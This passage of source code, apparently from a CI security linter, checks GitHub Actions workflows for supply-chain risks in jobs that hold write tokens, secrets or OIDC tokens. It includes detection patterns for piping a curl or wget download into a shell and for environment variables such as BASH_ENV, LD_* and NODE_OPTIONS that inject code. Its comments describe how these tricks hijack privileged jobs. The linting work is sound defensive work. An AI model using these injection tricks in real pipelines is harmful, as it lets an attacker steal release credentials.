  const secretRef = (x) => [...JSON.stringify(x ?? null).matchAll(/\$\{\{([\s\S]*?)\}\}/g)]
    .some((m) => /\bsecrets\b(?!\s*\.\s*GITHUB_TOKEN\b)/i.test(m[1]));
  for (const [name, job] of Object.entries(jobs)) {
    const perm = job.permissions ?? doc.permissions;
    // Workflow-level env reaches every job, so a secret there is held by all.
    const held = writes(perm) || secretRef({ env: doc.env, job });
    // Local composite actions are part of the job (#687): flatSteps expands
    // them, recursively, with inputs substituted.
    for (const [i, { st: s, via: path }] of flatSteps(job.steps).entries()) {
      const label = name + ": step " + (s.name ?? s.id ?? s.uses ?? String(i));
      const run = typeof s.run === "string" ? s.run : "";
      const via = path ? " (inside " + path.slice(0, -3) + ")" : "";
      for (const [t, bare] of lines(run)) {
        const holding = writes(perm) ? JSON.stringify(perm) : "a secret other than GITHUB_TOKEN";
        if (held && install.test(bare)) out.push(label + via + ": installs dependencies in a job holding " + holding + ": " + t);
        if (held && thirdParty.test(bare)) out.push(label + via + ": processes third-party data in a job holding " + holding + ": " + t);
        if (held && goCode.test(bare)) out.push(label + via + ": builds or tests Go code (module code is compiled or run) in a job holding " + holding + ": " + t);
        if (held && repoScript.test(bare)) out.push(label + via + ": runs a repository script in a job holding " + holding + ": " + t);
        // The write job takes generated TypeScript from a read-only job, and
        // the first thing to run it must be the PR CI, not this job: no
        // JavaScript runtime at all here, whatever script it is pointed at.
        if (held && (/(?:^|[\s;&|(/])(?:bun|bunx|node|npx|deno)(?=$|\s)/.test(bare) ||
            // A script file in command position runs through its shebang.
            /(?:^|[;&|(]\s*|\b(?:then|do|else|exec)\s+)[^\s;&|()]+\.(?:[cm]?[jt]s|tsx|jsx)(?=$|[\s;&|)])/.test(bare)))
          out.push(label + via + ": runs JavaScript in a job holding " + holding + ": " + t);
        if (bunInstall.test(bare) && !frozen.test(bare)) out.push(label + via + ": bun install without --frozen-lockfile: " + t);
      }
    }
    // A JavaScript runtime reached without a run line naming it: as the
    // step shell, or through an action that exists to run inline scripts.
    if (held)
      for (const [i, { st: s }] of flatSteps(job.steps).entries()) {
        const label = name + ": step " + (s.name ?? s.id ?? s.uses ?? String(i));
        if (/\b(?:bun|bunx|node|deno)\b/.test(String(s.shell ?? job.defaults?.run?.shell ?? doc.defaults?.run?.shell ?? "")))
          out.push(label + ": runs JavaScript (as its shell) in a job holding a write scope or a secret");
        if (String(s.uses ?? "").toLowerCase().startsWith("actions/github-script@"))
          out.push(label + ": runs JavaScript (github-script) in a job holding a write scope or a secret");
      }
    // #821: a job holding a write scope takes what a read-only job produced,
    // so its checkout leaves no token on disk for anything it then runs to
    // find. Nothing there needs one: create-pull-request hides any persisted
    // credential and configures its own from its token input, and gh reads
    // GH_TOKEN from the step env.
    if (held)
      for (const { st: s } of flatSteps(job.steps))
        if (String(s.uses ?? "").toLowerCase().startsWith("actions/checkout@") && s.with?.["persist-credentials"] !== false)
          out.push(name + ": checkout leaves the write token in .git/config (persist-credentials is not false)");
  }
}
if (rule === "mutable") {
  // Code a pinned action, or a run: step, fetches by a name that can move
  // (#681). A SHA-pinned action is only half the pin if it then downloads
  // `latest` of something and runs it with the token of this workflow.
  const envRef = /\$\{\{\s*env\.([A-Za-z_][A-Za-z0-9_]*)\s*\}\}/g;
  const resolve = (v, ...scopes) => String(v ?? "").replace(envRef, (m, k) => {
    for (const e of scopes) if (e && typeof e === "object" && k in e) return String(e[k]);
    return m;
  });
  // A version is floating when it is a channel name or a range. A bare
  // major ("22") is accepted for node-version only: setup-node takes it from
  // the runner image tool cache, so it moves with the image, not the network.
  const channel = /^\s*(latest|stable|canary|nightly|next|lts\/\*|\*|x)\s*$/i;
  const range = /[\^~<>*|]|(^|\.)x(\.|$)|\s-\s/i;
  const floating = (v, key = "") => {
    const t = String(v).trim();
    if (channel.test(t) || range.test(t)) return true;
    if (/^\d+$/.test(t) || /^\d+\.\d+$/.test(t)) return !(key === "node-version" && /^\d+$/.test(t));
    return false;
  };
  const exactVersion = /^v?\d+\.\d+\.\d+(-[0-9A-Za-z.-]+)?$/;
  const digest = /@sha256:[0-9a-f]{64}$/;
  // Shell $VAR / ${VAR} too, for a run: that reads an env value.
  const shellRef = /\$\{?([A-Za-z_][A-Za-z0-9_]*)\}?/g;
  const resolveShell = (t, scopes) => t.replace(shellRef, (m, k) => {
    for (const e of scopes) if (e && typeof e === "object" && k in e) return String(e[k]);
    return m;
  });
  for (const [k, v] of Object.entries(doc.env ?? {}))
    if (/version$/i.test(k) && floating(v)) out.push("env." + k + " is " + JSON.stringify(v));
  const authority = holdsAuthority();
  const on = doc.on ?? doc[true] ?? {};
  const callable = (typeof on === "string" ? [on] : Array.isArray(on) ? on : Object.keys(on)).includes("workflow_call");
  for (const [name, job] of Object.entries(jobs)) {
    for (const [k, v] of Object.entries(job.env ?? {}))
      if (/version$/i.test(k) && floating(resolve(v, doc.env)))
        out.push(name + ": env." + k + " is " + JSON.stringify(v));
    const flat = flatSteps(job.steps);
    for (const [i, { st: s, via }] of flat.entries()) {
      const label = name + ": step " + (via ? "(via " + via.slice(0, -3) + ") " : "") + (s.name ?? s.id ?? s.uses ?? String(i));
      const scopes = [s.env, job.env, doc.env];
      for (const [k, v] of Object.entries(s.env ?? {}))
        if (/version$/i.test(k) && floating(resolve(v, job.env, doc.env)))
          out.push(label + ": env." + k + " is " + JSON.stringify(v));
      // A version read from a repository file is whatever that file says --
      // for Bun, the engines range in package.json. go-version-file is allowed:
      // go.mod names one exact toolchain.
      for (const k of ["bun-version-file", "node-version-file"])
        if (s.with?.[k] !== undefined) out.push(label + ": " + k + " reads a version that may be a range");
      if (typeof s.with?.["go-version-file"] === "string") {
        // ...which holds only while the directive is three-part: `go 1.26`
        // lets setup-go pick the newest 1.26.x.
        let mod = "";
        try { mod = require("node:fs").readFileSync(process.env.REPO + "/" + s.with["go-version-file"], "utf8"); } catch {}
        const go = /^go\s+(\S+)\s*$/m.exec(mod)?.[1];
        const tc = /^toolchain\s+go(\S+)\s*$/m.exec(mod)?.[1];
        if (!go || !/^\d+\.\d+\.\d+$/.test(tc ?? go))
          out.push(label + ": " + s.with["go-version-file"] + " does not name an exact Go version (go " + go + (tc ? ", toolchain go" + tc : "") + ")");
      }
      for (const [k, v] of Object.entries(s.with ?? {}))
        if (/version$/i.test(k) && floating(resolve(v, ...scopes), k))
          out.push(label + ": " + k + " resolves to " + JSON.stringify(resolve(v, ...scopes)));
      if (typeof s.run === "string")
        for (const raw of s.run.replace(/\\\n/g, " ").split("\n")) {
          const line = resolveShell(resolve(raw, ...scopes), scopes).replace(/["\x27]/g, "").trim();
          if (line.startsWith("#")) continue;
          // A global install runs that package at whatever version the spec
          // names: every package in it needs an exact @x.y.z.
          // Options may come before the verb (npm -g install x), and the
          // global flag anywhere on the line (#960 review).
          // One exception (#1000): npm from the tarball checked against
          // NPM_INTEGRITY, exactly this line, which npmpin allows only in a
          // step whose script is, line for line, the version check,
          // download, sha512 check and this install, in every workflow. A
          // text check: it holds what the script says, which is what runs
          // as long as nothing else in the step does.
          const g = /\b(?:npm|pnpm)(?:\s+-\S+)*\s+(?:install|i|add)\b(.*)$/.exec(line);
          if (g && /(?:^|\s)(?:-g|--global|--location[= ]global)\b/.test(line) && raw.trim() !== "npm install -g --offline --ignore-scripts \"$npm_tgz\"")
            for (const tok of g[1].split(/\s+/).filter((x) => x && !x.startsWith("-"))) {
              // The first @ after the name, not the last (#960): in
              // npm@npm:other@1.2.3 the version is an alias that installs
              // another package, and its last @ is followed by 1.2.3.
              const at = tok.indexOf("@", 1);
              if (at <= 0 || !/^(?:@[\w.~-]+\/)?[\w.~-]+$/.test(tok.slice(0, at)) || !exactVersion.test(tok.slice(at + 1)))
                out.push(label + ": global install of " + tok + " is not an exact version: " + raw.trim());
            }
          if (/\b(?:bun|bunx|npx|pnpm|yarn)\b.*@(?:latest|next|canary|nightly)\b/.test(line))
            out.push(label + ": runs a floating version: " + raw.trim());
          if (/\b(?:curl|wget)\b[^|]*\|\s*(?:sudo\s+)?(?:ba|z)?sh\b/.test(line))
            out.push(label + ": pipes a download into a shell: " + raw.trim());
        }
      // Owner and repository names are case-insensitive to GitHub (#1048).
      const uses = String(s.uses ?? "").toLowerCase();
      // A pinned version is only what is requested: these actions restore
      // the bytes from the Actions cache, which any run on main can write.
      if (uses.startsWith("oven-sh/setup-bun@") && String(s.with?.["no-cache"]) !== "true")
        out.push(label + ": setup-bun without no-cache: true restores Bun from the Actions cache");
      // (#1047) A workflow that holds no authority may restore from the
      // Actions cache by its exact key only, in one form, three steps in a
      // row: actions/cache/restore with lookup-only true (downloads nothing,
      // reports cache-hit true only for the exact key); actions/cache with
      // the same key and path and lookup-only exactly "not that exact hit",
      // so a prefix match (the cache service matches the key itself as a
      // prefix too) is not extracted, tar -P and all, unless the exact entry
      // is evicted or deleted between the two steps; and a discard of every cached path unless
      // its own hit is exact. Both cache steps take only path, key and
      // lookup-only, read case-insensitively as GitHub does. The discard is
      // read line by line: rm -rf of a literal path or of "$K" from its env,
      // or go clean -modcache with GOMODCACHE in its env, and nothing else;
      // its env holds exactly those names, none starting with ~, and neither
      // the job nor the workflow sets a name that changes what it runs. A
      // workflow_call callee counts as holding authority here: with no
      // permissions of its own it runs with its caller token. Not stopped: an
      // entry written at the exact key before CI wrote it. The toolchain
      // actions above restore through their own key and take any prefix
      // match, with no switch to refuse it, so they stay refused everywhere.
      if (/^actions\/cache(\/restore)?@/.test(uses)) {
        const one = (x) => String(x ?? "").replace(/\s+/g, " ").trim();
        const hitIs = (id) => "steps." + id + ".outputs.cache-hit != \x27true\x27";
        const isCache = (x, kind) => x !== undefined && x.via === via && new RegExp("^actions/cache" + kind + "@").test(String(x.st.uses ?? "").toLowerCase());
        // with: keyed in lower case; null when two keys differ only by case.
        const lower = (w) => {
          const m = {};
          for (const [k, v] of Object.entries(w ?? {})) { const l = k.toLowerCase(); if (l in m) return null; m[l] = v; }
          return m;
        };
        const w = lower(s.with);
        const rk = w?.["restore-keys"];
        const prefixed = rk !== undefined && rk !== null && String(rk).trim() !== "";
        const onlyThese = (x) => x !== null && Object.keys(x).every((k) => ["path", "key", "lookup-only"].includes(k));
        if (authority || callable) out.push(label + ": restores from the Actions cache (writable by any run on main)");
        else if (prefixed) out.push(label + ": restores by a key prefix (restore-keys), not by its exact key only");
        else if (!onlyThese(w)) out.push(label + ": takes inputs other than path, key and lookup-only, or one spelled twice");
        else if (/^actions\/cache\/restore@/.test(uses)) {
          // Only as the lookup in front of the actions/cache step below.
          const next = flat[i + 1];
          if (String(w["lookup-only"]) !== "true" || !isCache(next, ""))
            out.push(label + ": actions/cache/restore here is not a lookup-only step right before the actions/cache step it gates");
        } else {
          const prev = flat[i - 1], next = flat[i + 1];
          const pw = prev !== undefined ? lower(prev.st.with) : null;
          const lid = isCache(prev, "/restore") ? String(prev.st.id ?? "") : "";
          const gated = lid !== "" && onlyThese(pw) && String(pw["lookup-only"]) === "true" &&
            one(pw.key) === one(w.key) && one(pw.path) === one(w.path) &&
            one(w["lookup-only"]) === "${{ " + hitIs(lid) + " }}";
          if (!gated)
            out.push(label + ": not gated by a lookup-only actions/cache/restore of the same key and path right before it (lookup-only: ${{ steps.<lookup id>.outputs.cache-hit != \x27true\x27 }}), so a prefix match is extracted");
          const id = String(s.id ?? "");
          const paths = String(w.path ?? "").split("\n").map((x) => x.trim()).filter(Boolean);
          const d = next !== undefined && next.via === via ? next.st : undefined;
          const env = d?.env ?? {};
          const removed = new Set(), used = new Set();
          const lines = d && typeof d.run === "string" ? d.run.split("\n").map((x) => x.trim()).filter(Boolean) : [];
          // Names that change what the discard runs: never in its env (but
          // GOMODCACHE, for go clean -modcache), nor in the job, workflow or
          // enclosing step env that reaches it (#1047 review 3).
          const steer = /^(?:GO[A-Z0-9_]*|BASH_ENV|ENV|HOME|PATH|IFS|PS4|SHELLOPTS|BASHOPTS|LD_[A-Z0-9_]*|BASH_FUNC_.*|XDG_[A-Z0-9_]*|APPDATA|LOCALAPPDATA|USERPROFILE)$/i;
          const fromEnv = (k) => typeof env[k] === "string" && !env[k].trim().startsWith("~");
          const plain = lines.length > 0 && lines.every((l) => {
            let m;
            if (l === "go clean -modcache" && fromEnv("GOMODCACHE")) { removed.add(env.GOMODCACHE.trim()); used.add("GOMODCACHE"); return true; }
            if ((m = /^rm -rf (?:-- )?"\$\{?([A-Za-z_][A-Za-z0-9_]*)\}?"$/.exec(l)) && fromEnv(m[1]) && (m[1] === "GOCACHE" || !steer.test(m[1]))) { removed.add(env[m[1]].trim()); used.add(m[1]); return true; }
            if ((m = /^rm -rf (?:-- )?([^\s"\x27$;&|`<>()]+)$/.exec(l))) { removed.add(m[1]); return true; }
            return false;
          });
          // An env this rule cannot read as a mapping (one expression for the
          // whole block) could hold any of them (#1047 review 4).
          const mapping = (e) => e === undefined || e === null || (typeof e === "object" && !Array.isArray(e) && Object.keys(e).every((k) => !k.includes("${{")));
          const steered = Object.keys({ ...(doc.env ?? {}), ...(job.env ?? {}), ...(next?.penv ?? {}) }).filter((k) => steer.test(k));
          if (![doc.env, job.env, next?.penv, d?.env].every(mapping)) steered.push("an env this rule cannot read as a mapping");
          // ...and so could any step before it that writes GITHUB_ENV or
          // GITHUB_PATH at run time: only a literal NAME=value echoed or
          // printed into GITHUB_ENV, under a name steer does not match, is
          // read (#1047 review 4). What actions write there (setup-go puts Go
          // on PATH) is not readable here and is not checked.
          for (const { st: b } of flat.slice(0, i + 1)) {
            const run = typeof b.run === "string" ? b.run : "";
            if (/GITHUB_PATH/.test(run)) steered.push("GITHUB_PATH (written by an earlier step)");
            for (const l of run.split("\n").filter((x) => /GITHUB_ENV/.test(x))) {
              const names = [...l.matchAll(/(?:^|[\s;&|(])(?:echo|printf)\s+["\x27]?([A-Za-z_][A-Za-z0-9_]*)=[^>]*?["\x27]?\s*>>\s*"?\$\{?GITHUB_ENV\}?"?/g)].map((m) => m[1]);
              if (names.length !== (l.match(/GITHUB_ENV/g) ?? []).length) steered.push("GITHUB_ENV written in a form this rule cannot read (by an earlier step)");
              for (const n of names) if (steer.test(n)) steered.push(n + " (written to GITHUB_ENV by an earlier step)");
            }
          }
          const discards = id !== "" && d !== undefined && one(d.if) === hitIs(id) &&
            Object.keys(d).every((k) => ["name", "if", "shell", "env", "run"].includes(k)) && d.shell === "bash" &&
            plain && Object.keys(env).every((k) => used.has(k)) && steered.length === 0 &&
            paths.length > 0 && paths.every((p) => removed.has(p));
          if (!discards)
            out.push(label + ": a restore that is not an exact key match is not discarded by the step right after it (if: " + hitIs(id || "<id>") + ", shell bash, rm -rf or go clean -modcache of every cached path and nothing else, env only what those lines read" + (steered.length ? "; the job, workflow or enclosing step sets " + steered.join(", ") : "") + ")");
        }
      }
      // setup-node turns on its npm cache when package.json names npm as
      // packageManager, unless told not to (#1046 review).
      if (uses.startsWith("actions/setup-node@") && (String(s.with?.["package-manager-cache"]) !== "false" || s.with?.cache !== undefined))
        out.push(label + ": setup-node without package-manager-cache: false, or with cache:, restores from the Actions cache");
      if (uses.startsWith("actions/setup-go@") && String(s.with?.cache) !== "false")
        out.push(label + ": setup-go without cache: false restores modules and build output from the Actions cache");
      if (uses.startsWith("docker/setup-qemu-action@")) {
        // The binfmt image runs --privileged. Its default is :latest, and
        // cache-image (default true) loads it from the Actions cache before
        // every pull, and keeps that copy when the pull fails.
        const image = resolve(s.with?.image, ...scopes);
        if (!digest.test(image)) out.push(label + ": binfmt image is not pinned by digest (" + JSON.stringify(image || "default :latest") + ")");
        if (String(s.with?.["cache-image"]) !== "false") out.push(label + ": cache-image is not false");
      }
      if (uses.startsWith("docker/setup-buildx-action@") &&
          (s.with?.driver === undefined || s.with.driver === "docker-container")) {
        // The docker-container driver runs BuildKit from an image, by
        // default moby/buildkit:buildx-stable-1.
        const opts = resolve(s.with?.["driver-opts"], ...scopes).split(/\n|,/).map((x) => x.trim());
        const image = (opts.find((o) => o.startsWith("image=")) ?? "").slice("image=".length);
        if (!digest.test(image)) out.push(label + ": BuildKit image is not pinned by digest (" + JSON.stringify(image || "default buildx-stable-1") + ")");
      }
      // #680: an SBOM attestation runs a generator IMAGE inside the build,
      // with the image filesystem mounted, and its default is the tag
      // docker/buildkit-syft-scanner:stable-1. Both spellings: the sbom
      // input (true, or generator=...) and an attests entry of type=sbom.
      if (/^docker\/(build-push-action|bake-action)@/i.test(uses)) {
        const specs = [];
        const sbom = resolve(s.with?.sbom, ...scopes).trim();
        if (sbom && sbom.toLowerCase() !== "false") specs.push(sbom);
        for (const a of resolve(s.with?.attests, ...scopes).split("\n"))
          if (/(?:^|,)\s*type\s*=\s*sbom\b/i.test(a)) specs.push(a);
        for (const spec of specs) {
          const g = /(?:^|,)\s*generator\s*=\s*([^,\s]+)/i.exec(spec)?.[1] ?? "";
          if (!digest.test(g)) out.push(label + ": SBOM generator image is not pinned by digest (" + JSON.stringify(g || "default stable-1") + ")");
        }
      }
    }
  }
}
if (rule === "narrow") {
  // Per-job authority on the release path (#682).
  const fs = require("node:fs");
  const writes = (perm, k) => perm === "write-all" || (perm && typeof perm === "object" && perm[k] === "write");
  const refs = (o) => new Set([...JSON.stringify(o).matchAll(/\bsecrets\s*\.\s*([A-Za-z_][A-Za-z0-9_]*)/gi)].map((m) => m[1]).filter((k) => k.toUpperCase() !== "GITHUB_TOKEN"));
  // The release path: any workflow with a job in the `release` environment
  // (release-exec.yml and sidecar-release.yml). None of their jobs runs git
  // with credentials, so none needs the token left in the repository config.
  //
  // The name may be an expression, because a dry run names a different
  // environment so a rehearsal is not recorded as a deployment of `release`.
  // A literal `release` counts, and so does an expression that can evaluate to
  // it -- matched as the quoted word inside `${{ }}`, not as a bare substring,
  // so an environment merely CALLED `release-dry-run` does not qualify on its
  // own. Getting this wrong fails open: every rule below is gated on it, and
  // five assertions here exist to catch that.
  const gatedByRelease = (j) => {
    const n = j.environment?.name ?? j.environment;
    if (typeof n !== "string") return false;
    if (n === "release") return true;
    return n.includes("${{") && /(^|[^-\w])'release'([^-\w]|$)/.test(n);
  };
  // ...and (#779) any workflow in which a job can mint an OIDC token. The
  // environment test alone used to miss installer-release.yml: it had no
  // `release` environment, yet it compiled the job that federates into the
  // same KMS signing key as the sidecar. #920 has since gated its `publish`
  // job on `release`, so it now qualifies either way. The token test stays,
  // because a token is the authority whatever the environment is called, and
  // a workflow added later can mint one with no environment at all.
  const mintsToken = Object.values(jobs).some((j) => writes(j.permissions ?? doc.permissions, "id-token"));
  const release = Object.values(jobs).some(gatedByRelease) || mintsToken;
  for (const [name, job] of Object.entries(jobs)) {
    const perm = job.permissions ?? doc.permissions;
    const oidc = writes(perm, "id-token");
    // GitHub has no per-leg permissions: a matrix job holding id-token hands
    // it to every leg, whichever one needs it.
    if (oidc && job.strategy?.matrix && typeof job.uses !== "string")
      out.push(name + ": a matrix job holding id-token: write (every leg can mint a token)");
    if (job.secrets === "inherit")
      out.push(name + ": secrets: inherit (pass the named secrets the called workflow declares)");
    if (typeof job.uses === "string" && job.uses.startsWith("./") && job.secrets !== "inherit") {
      let called = null;
      try { called = Bun.YAML.parse(fs.readFileSync(process.env.REPO + "/" + job.uses.slice(2), "utf8")); } catch {}
      if (!called) out.push(name + ": cannot read " + job.uses);
      else {
        const on = called.on ?? called[true] ?? {};
        const declared = Object.keys(on.workflow_call?.secrets ?? {}).sort();
        const used = [...refs(called.jobs ?? {})].sort();
        if ([...JSON.stringify(called.jobs ?? {}).matchAll(/\$\{\{([\s\S]*?)\}\}/g)].some((m) => /\bsecrets\b(?!\s*\.)/i.test(m[1])))
          out.push(name + ": " + job.uses + " reads the whole secrets context, so no list of secrets passed to it can be checked");
        // No `secrets:` at all passes nothing, which is the case that makes
        // the macOS signing steps silently skip.
        const given = job.secrets && typeof job.secrets === "object" ? job.secrets : {};
        const passed = Object.keys(given).sort();
        if (JSON.stringify(declared) !== JSON.stringify(used))
          out.push(name + ": " + job.uses + " reads secrets " + JSON.stringify(used) + " but declares " + JSON.stringify(declared));
        if (JSON.stringify(passed) !== JSON.stringify(declared))
          out.push(name + ": passes " + JSON.stringify(passed) + " to " + job.uses + ", which declares " + JSON.stringify(declared));
        for (const [k, v] of Object.entries(given))
          if (String(v).replace(/\s+/g, "") !== "${{secrets." + k + "}}")
            out.push(name + ": passes " + k + " as " + JSON.stringify(v) + ", not secrets." + k);
      }
    }
    // Composite actions expanded (#687): a local action is part of the job.
    const steps = flatSteps(job.steps).map((x) => x.st);
    const runs = steps.map((st) => typeof st.run === "string" ? st.run : "").join("\n");
    // A job that can mint an npm publish token publishes, and runs no
    // dependency or repository build code: that happens in a job without it.
    // Commands only: a word at the start of a line, after ; & | ( ! or $( or
    // a backtick, after then/do/else, or behind sudo/env/exec/time/command.
    // Also behind if/elif/while/until, VAR=value assignments, timeout N,
    // xargs and nohup, and with a directory in front of the program.
    // Also inside a { ...; } group, and behind sudo or env options that take
    // a value (sudo -u root, env -u VAR) (#817 review).
    const cmd = (w) => new RegExp("(?:^|[;&|(!`{]\\s*|\\$\\(\\s*|\\b(?:then|do|else|if|elif|while|until)\\s+)" +
      "(?:(?:sudo|env|exec|time|command|nice|nohup|xargs)\\s+(?:-[ugCDhprtU]\\s+\\S+\\s+|-\\S+\\s+)*|timeout\\s+(?:-\\S+\\s+)*\\S+\\s+|[A-Za-z_][A-Za-z0-9_]*=\\S*\\s+)*(?:\\S*/)?" + w);
    // Comments: a # at line start or after whitespace, outside ${#...} and
    // outside quotes, so `echo "step #1"; cmd` keeps its cmd (#817 review).
    const stripComment = (l) => {
      let q = "";
      for (let i = 0; i < l.length; i++) {
        const c = l[i];
        if (q) { if (c === q) q = ""; else if (c === "\\" && q === "\"") i++; continue; }
        if (c === "\"" || c === "\x27") { q = c; continue; }
        if (c === "\\") { i++; continue; }
        if (c === "#" && (i === 0 || /\s/.test(l[i - 1])) && l[i + 1] !== "{") return l.slice(0, i);
      }
      return l;
    };
    const lines = runs.split("\n").map((l) => stripComment(l).trim());
    // npm verbs that run package or repository code, and any global install
    // that is not npm itself from the tarball checked against NPM_INTEGRITY
    // (#1000; npmpin holds the checks before that line).
    // Options may come before the verb (#960 review: npm -g install x).
    const npmRuns = cmd("npm(?:\\s+-\\S+)*\\s+(?:ci|install|i|add|isntall|in|it|install-test|install-ci-test|run|run-script|rum|urn|exec|x|pack|rebuild|rb|test|t|tst|start|restart|stop|update|up|upgrade|dedupe|link|ln|explore)\\b");
    // The pinned install is that exact line and nothing else on it: no
    // VAR=value in front (npm_config_registry=...), no other spelling.
    const isGlobal = (line) => /\s(?:-g|--global|--location[= ]global)\b/.test(line);
    const globalOther = (line) => /\bnpm(?:\s+-\S+)*\s+(?:install|i|add)\b/.test(line) && isGlobal(line) &&
      line.trim() !== "npm install -g --offline --ignore-scripts \"$npm_tgz\"";
    if (oidc && /\bnpm\b[^\n;&|]*\spublish\b/.test(runs)) {
      if (steps.some((st) => String(st.uses ?? "").startsWith("oven-sh/setup-bun@")))
        out.push(name + ": publishes with id-token and installs Bun");
      // The shell a step runs in, its own or a default, is one of the plain
      // ones: anything else (env X=y bash, bash -c ...) runs code first.
      const plainShell = ["bash", "sh", "bash -e {0}", "sh -e {0}", "bash --noprofile --norc -eo pipefail {0}"];
      for (const st of steps) {
        const sh = st.shell ?? job.defaults?.run?.shell ?? doc.defaults?.run?.shell;
        if (sh !== undefined && !plainShell.includes(String(sh).trim()))
          out.push(name + ": step with shell: " + sh + " in a job that publishes with id-token");
      }
      // npm reads npm_config_* from the environment, the registry included,
      // so the pinned install could come from anywhere; and setup-node may
      // point the publish at the npm registry only.
      for (const [lvl, e] of [["workflow", doc.env], ["job", job.env], ...steps.map((st) => ["step " + (st.name ?? st.uses ?? ""), st.env])])
        for (const k of Object.keys(e ?? {}))
          if (/^npm_config_/i.test(k)) out.push(name + ": " + lvl + " env sets " + k + " in a job that publishes with id-token");
      for (const st of steps)
        if (String(st.uses ?? "").toLowerCase().startsWith("actions/setup-node@") && st.with?.["registry-url"] !== undefined &&
            String(st.with["registry-url"]).replace(/\/$/, "") !== "https://registry.npmjs.org")
          out.push(name + ": setup-node registry-url is " + JSON.stringify(st.with["registry-url"]) + ", not https://registry.npmjs.org");
      for (const line of lines)
        if (cmd("(?:bun|bunx|npx|yarn|pnpm|node|make|python3?|perl|ruby|deno|go)\\b").test(line) ||
            (npmRuns.test(line) && !(isGlobal(line) && !globalOther(line))) || globalOther(line))
          out.push(name + ": publishes with id-token and runs: " + line);
      // #1046: npm version and a directory npm publish run the lifecycle
      // scripts of the package.json they act on (preversion, version,
      // postversion, prepublishOnly, prepack, prepare, postpack, publish,
      // postpublish: all nine ran on npm 12.1.0 without the flag, none with
      // it), so each carries --ignore-scripts. A publish of a .tgz path runs
      // none (measured too), which is the publish-brain shape. npm takes any
      // unambiguous abbreviation of a command (npm vers, npm publi) and the
      // alias verison, so a verb is counted when it starts either word.
      // runAllow pins the exact forms as well; this says why.
      const npmVerb = new RegExp(cmd("npm(?:\\s+-\\S+)*\\s+([A-Za-z-]+)").source, "g");
      for (const line of lines)
        for (const m of line.matchAll(npmVerb)) {
          const v = m[1].toLowerCase();
          // From the npm word to the end of that command. A relative path
          // ending in npm (find sidecar/npm ...) is an argument that cmd
          // happens to match, not a program: a program is npm or a path
          // from / or ./ (the same reading as the rest of this rule).
          const at = m.index + m[0].lastIndexOf("npm");
          const word = m[0].slice(0, m[0].lastIndexOf("npm")).split(/[\s"$(`=]/).pop();
          if (word !== "" && !/^\.?\//.test(word)) continue;
          const seg = line.slice(at).split(/[|;&)]/)[0];
          // An option before the verb hides it from this rule (npm
          // --loglevel warn publish reads warn as the verb), so only
          // npm --version goes that way (security review of #1046).
          if (/^npm\s+-/.test(seg) && !/^npm\s+--version\s*$/.test(seg)) {
            out.push(name + ": runs npm with an option before its command, which this rule does not read (#1046): " + line);
            continue;
          }
          if (v.length < 2 || !["version", "verison", "publish"].some((w) => w.startsWith(v))) continue;
          // npm reads the last of these, and a value after the flag or a
          // --no- form turns it off (measured on npm 12.1.0).
          // npm expands any unique prefix of an option, so every option
          // that could expand to ignore-scripts, negated or given a value,
          // is refused but the exact --ignore-scripts. A program run by a
          // relative path (bin/npm) is not read here; runAllow pins every
          // npm form, and refuses any command name that is a path, for that.
          const igs = [...seg.matchAll(/(?:^|\s)(--(?:no-)?ig[^\s=]*)(=\S*|\s+(?:true|false)\b)?/g)];
          if (igs.some((g) => g[1] !== "--ignore-scripts" || g[2] !== undefined))
            out.push(name + ": runs npm " + m[1] + " with --ignore-scripts given a value or negated (#1046): " + line);
          const isVersion = ["version", "verison"].some((w) => w.startsWith(v));
          if (isVersion && !/(?:^|\s)--workspaces=false(?=\s|$)/.test(seg))
            out.push(name + ": runs npm " + m[1] + " without --workspaces=false, which installs a workspace root above the package with id-token in reach (#1046): " + line);
          if (/(?:^|\s)--ignore-scripts(?=\s|$)/.test(seg)) continue;
          if (/\bnpm\s+publish\s+"[^"]*\.tgz"/.test(seg.replace(/\$\{TARBALL\}/g, "x.tgz"))) continue;
          out.push(name + ": runs npm " + m[1] + " without --ignore-scripts, which runs package.json lifecycle scripts with id-token in reach (#1046): " + line);
        }
    }
    // #999: in a job holding id-token, no env names code to run before or
    // inside the steps. BASH_ENV and ENV name a file the shell sources
    // before the script, PATH can put another npm ahead of the real one,
    // NODE_OPTIONS preloads code into node; and their relatives: LD_*
    // preloads into every program, BASH_FUNC_* imports a function over any
    // command, SHELLOPTS or BASHOPTS can turn on xtrace, which expands PS4,
    // and ACTIONS_ALLOW_UNSECURE_COMMANDS lets any output line set env or
    // PATH (::set-env, ::add-path). Names compared ignoring case, as a
    // Windows runner does. An env this rule cannot read (an expression) is
    // refused too, and so is any step text that names GITHUB_ENV,
    // GITHUB_PATH or the runner file they point at: a line written there
    // sets any variable, or the PATH, for every later step of the job. A
    // shell: is held to the plain ones, as in the publish jobs above, since
    // `env X=y bash {0}` is env by another name.
    //
    // The security review of #999 added: the proxy variables and the CA
    // ones (a proxy that a trusted extra CA lets terminate TLS sees the
    // OIDC exchange and the publish), HOME and XDG_CONFIG_HOME (another
    // .npmrc), NODE_PATH, CDPATH (where a relative cd lands), TMPDIR (a
    // relative one turned the checked npm tarball path into a git spec,
    // review of #1000), OPENSSL_CONF and friends (load modules into
    // openssl, curl and node), and any
    // GITHUB_*, RUNNER_* or ACTIONS_* name (the runner own variables, the
    // id-token request pair and the env file paths among them). A list of
    // bad names is never complete, so the names are also held to the ones
    // these jobs use today (knownEnv): a new one has to be argued for here.
    // And no container: or services: at all: container options pass any
    // docker flag, --env included, and the image runs every step.
    // #1030: and in a job that installs npm from the checked tarball or
    // runs npm pack, though it holds no id-token: pack-brain does both, and
    // publish-brain publishes what it packed. Identified by the commands, not
    // the job name, so a job renamed or added that packs is held too. What
    // this buys is narrow: the install and pack steps run as written, with
    // no BASH_ENV, PATH, NODE_OPTIONS or GITHUB_ENV line in front of them, so
    // the npm integrity check (#1000) and the pack are what the script says.
    // It does not stop code running in that job: bun install runs dependency
    // lifecycle scripts and prepublishOnly runs repository code there by
    // design (#682), and either can change what is packed. The digest check
    // in publish-brain proves only that the tarball was not swapped after
    // the pack, not that the pack ran clean code.
    const npmInstallLine = "npm install -g --offline --ignore-scripts \"$npm_tgz\"";
    // Continuation lines joined, so `npm \` then `pack` on the next is a pack.
    // Options before the verb may take a value (npm --loglevel silent pack, review of #1030).
    const packRe = cmd("npm(?:\\s+-\\S+(?:\\s+[^-\\s]\\S*)?)*\\s+pack\\b");
    // Quotes and backslashes dropped for the pack test, as bash drops them
    // ("npm" pack and n\\pm pack are npm pack), and bun pm pack is a pack too
    // (security review of #1030). A verb that comes from a variable is not
    // seen.
